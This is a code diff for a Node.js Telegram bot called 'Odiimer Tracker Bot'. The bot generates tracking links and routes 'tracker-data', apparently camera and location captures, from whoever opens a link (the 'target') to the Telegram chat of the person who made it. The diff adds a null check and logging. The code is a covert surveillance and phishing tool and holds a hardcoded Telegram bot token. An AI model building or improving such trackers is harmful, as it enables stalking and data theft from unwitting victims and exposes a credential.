@@ -1,4 +1,4 @@
-Const express = require('express');
+const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
@@ -9,7 +9,7 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Aapka Telegram Bot Token
+// Apna Telegram Bot Token yahan daal le
 const token = '8786094194:AAF6p3VRITap85oCBEVQRkVzVbyhIXBpz0Q';
 const bot = new TelegramBot(token, { polling: true });
 
@@ -34,10 +34,9 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, "🤖 *Odiimer Tracker Bot*\n\nNeeche diye gaye buttons par click karke tracking link generate karein:", { parse_mode: 'Markdown', ...opts });
 });
 
-// Button Click Handling (Jo user click karega, link uske chatId se banega)
+// Button Click Handling
 bot.on('callback_query', (callbackQuery) => {
-    const msg = callbackQuery.message;
-    const chatId = msg.chat.id; // Yahan se user ki apni Chat ID uthegi
+    const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
     
     const timestamp = Date.now();
@@ -47,7 +46,6 @@ bot.on('callback_query', (callbackQuery) => {
     else if (data === 'gen_camera') mode = 'camera';
     else if (data === 'gen_both') mode = 'both';
 
-    // Session ID mein user ki chatId save ho jayegi
     const sessionId = `${chatId}_${timestamp}_${mode}`;
     
     const domain = process.env.RENDER_EXTERNAL_URL || 'http://localhost:3000';
@@ -80,8 +78,11 @@ io.on('connection', (socket) => {
     socket.on('tracker-data', async (data) => {
         console.log('Data received from target!');
         
+        if (!data.roomId) return;
         const parts = data.roomId.split('_');
-        const targetChatId = parts[0]; // Link jisne banaya tha, data usi ki Chat ID par jayega
+        const targetChatId = parts[0]; 
+
+        console.log(`Target Chat ID to send: ${targetChatId}`);
 
         if (targetChatId) {
             try {
